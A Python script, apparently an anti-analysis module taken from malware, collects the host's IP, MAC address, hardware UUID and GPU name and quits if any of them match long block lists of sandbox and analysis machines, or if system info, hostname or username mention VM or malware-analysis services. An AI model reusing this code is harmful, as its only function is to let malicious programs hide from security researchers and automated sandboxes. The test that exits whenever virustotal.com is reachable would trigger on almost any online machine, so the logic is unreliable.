import os
import sys
import subprocess
import socket
import uuid
import re
import requests

blacklisted_ips = []
blacklisted_macs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
blacklisted_hwids = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919']
blacklisted_gpus = ['VirtualBox Graphics Adapter', 'VMware SVGA II']

def get_system_info():
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    gpu_info = subprocess.check_output("wmic path win32_videocontroller get caption").decode()
    gpu = [gpu.strip() for gpu in gpu_info.splitlines()[1:] if gpu.strip()][0] if gpu_info else "Unknown GPU"
    return ip_address, mac_address, hwid, gpu

def detect_environment():
    vm_indicators = ['VBOX', 'VIRTUALBOX', 'VMWARE', 'XEN', 'QEMU', 'VIRTUAL', 'HYPERVISOR', 'SBOX', 'SANDBOX', 'CWSANDBOX']
    analysis_indicators = ['virustotal', 'hybrid-analysis', 'cuckoo', 'malwr', 'any.run', 'reverse.it', 'joe sandbox', 'threatgrid', 'cape sandbox', 'totalhash', 'intezer']
    output = subprocess.check_output('systeminfo').decode().upper()
    hostname = socket.gethostname().lower()
    username = os.getlogin().lower()
    for indicator in vm_indicators + analysis_indicators:
        if indicator in output or indicator in hostname or indicator in username:
            return True
    try:
        if requests.get('https://www.virustotal.com/').status_code == 200:
            return True
    except:
        pass
    return False

ip_address, mac_address, hwid, gpu = get_system_info()

if detect_environment() or ip_address in blacklisted_ips or mac_address in blacklisted_macs or hwid in blacklisted_hwids or gpu in blacklisted_gpus:
    sys.exit()
